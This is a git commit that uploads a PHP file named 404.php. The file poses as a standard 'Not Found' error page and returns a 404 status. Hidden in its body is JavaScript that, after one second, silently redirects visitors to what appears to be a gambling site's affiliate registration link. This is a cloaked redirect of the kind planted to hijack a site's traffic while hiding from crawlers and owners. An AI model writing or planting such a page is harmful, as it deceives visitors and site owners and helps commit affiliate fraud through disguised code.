64e5c7806139e5eee2194f806a94eee41c83611d
Igor Bakalov <b7186rft@gmail.com>
2024-02-05 11:51:12 +0100

    Add files via upload

---
+++ 404.php
@@ -0,0 +1,12 @@
+<?php header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");?>
+<html>
+<head>
+<title>404 Not Found</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<body>
+<script type="text/javascript"> 
+	setTimeout('location.replace("https://platnik.com/1win_reg/?ref=blablabla")', 1000); 
+</script> 
+</body>
+</html>
